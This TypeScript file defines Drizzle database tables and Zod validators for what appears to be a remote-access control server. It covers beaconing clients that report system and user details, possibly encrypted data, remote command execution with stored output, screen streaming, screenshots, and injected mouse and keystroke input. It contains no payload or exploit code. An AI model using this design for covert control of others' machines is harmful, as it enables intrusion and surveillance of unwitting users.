import { pgTable, text, serial, integer, boolean, timestamp, jsonb } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

// Users schema
export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  apiKey: text("api_key"),
  createdAt: timestamp("created_at").defaultNow(),
});

// Client schema 
export const clients = pgTable("clients", {
  id: serial("id").primaryKey(),
  clientId: text("client_id").notNull().unique(),
  hostname: text("hostname").notNull(),
  ip: text("ip").notNull(),
  platform: text("platform").notNull(),
  platformRelease: text("platform_release"),
  platformVersion: text("platform_version"),
  architecture: text("architecture"),
  processor: text("processor"),
  username: text("username"),
  screenResolution: text("screen_resolution"),
  lastSeen: timestamp("last_seen").defaultNow(),
  firstSeen: timestamp("first_seen").defaultNow(),
  status: text("status").default("active"),
  additionalInfo: jsonb("additional_info"),
});

// Command schema
export const commands = pgTable("commands", {
  id: serial("id").primaryKey(),
  clientId: text("client_id").notNull(),
  command: text("command").notNull(),
  output: text("output"),
  status: text("status").default("pending"),
  createdAt: timestamp("created_at").defaultNow(),
  completedAt: timestamp("completed_at"),
});

// Activity logs schema
export const activities = pgTable("activities", {
  id: serial("id").primaryKey(),
  clientId: text("client_id"),
  type: text("type").notNull(),
  description: text("description").notNull(),
  createdAt: timestamp("created_at").defaultNow(),
  data: jsonb("data"),
});

// Settings schema
export const settings = pgTable("settings", {
  id: serial("id").primaryKey(),
  key: text("key").notNull().unique(),
  value: text("value").notNull(),
  description: text("description"),
});

// Schemas for insert operations
export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  apiKey: true,
});

export const insertClientSchema = createInsertSchema(clients).pick({
  clientId: true,
  hostname: true,
  ip: true,
  platform: true,
  platformRelease: true,
  platformVersion: true,
  architecture: true,
  processor: true,
  username: true,
  screenResolution: true,
  status: true,
  additionalInfo: true,
});

export const insertCommandSchema = createInsertSchema(commands).pick({
  clientId: true,
  command: true,
  output: true,
  status: true,
});

export const insertActivitySchema = createInsertSchema(activities).pick({
  clientId: true,
  type: true,
  description: true,
  data: true,
});

export const insertSettingSchema = createInsertSchema(settings).pick({
  key: true,
  value: true,
  description: true,
});

// Types for insert operations
export type InsertUser = z.infer<typeof insertUserSchema>;
export type InsertClient = z.infer<typeof insertClientSchema>;
export type InsertCommand = z.infer<typeof insertCommandSchema>;
export type InsertActivity = z.infer<typeof insertActivitySchema>;
export type InsertSetting = z.infer<typeof insertSettingSchema>;

// Types for select operations
export type User = typeof users.$inferSelect;
export type Client = typeof clients.$inferSelect;
export type Command = typeof commands.$inferSelect;
export type Activity = typeof activities.$inferSelect;
export type Setting = typeof settings.$inferSelect;

// Additional validation schemas
export const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
  apiKey: z.string().optional(),
});

export const clientBeaconSchema = z.object({
  clientId: z.string().optional(),
  systemInfo: z.object({
    hostname: z.string(),
    ip: z.string(),
    platform: z.string(),
    platformRelease: z.string().optional(),
    platformVersion: z.string().optional(),
    architecture: z.string().optional(),
    processor: z.string().optional(),
    username: z.string().optional(),
    screenResolution: z.string().optional(),
    timestamp: z.string().optional(),
  }),
  data: z.string().optional(), // Encrypted data
});

export const executeCommandSchema = z.object({
  clientId: z.string(),
  command: z.string(),
});

export const commandResultSchema = z.object({
  clientId: z.string(),
  commandId: z.number(),
  output: z.string(),
  status: z.string(),
});

export const streamRequestSchema = z.object({
  clientId: z.string(),
  quality: z.number().min(1).max(100).default(30),
  fps: z.number().min(1).max(30).default(5),
  action: z.enum(["start", "stop"]),
});

export const screenshotRequestSchema = z.object({
  clientId: z.string(),
  quality: z.number().min(1).max(100).default(50),
});

export const clientActionSchema = z.object({
  clientId: z.string(),
  action: z.enum(["mouseClick", "keyStroke", "specialKey"]),
  data: z.object({
    x: z.number().optional(),
    y: z.number().optional(),
    button: z.number().optional(),
    key: z.string().optional(),
    keyCode: z.number().optional(),
  }).optional(),
});
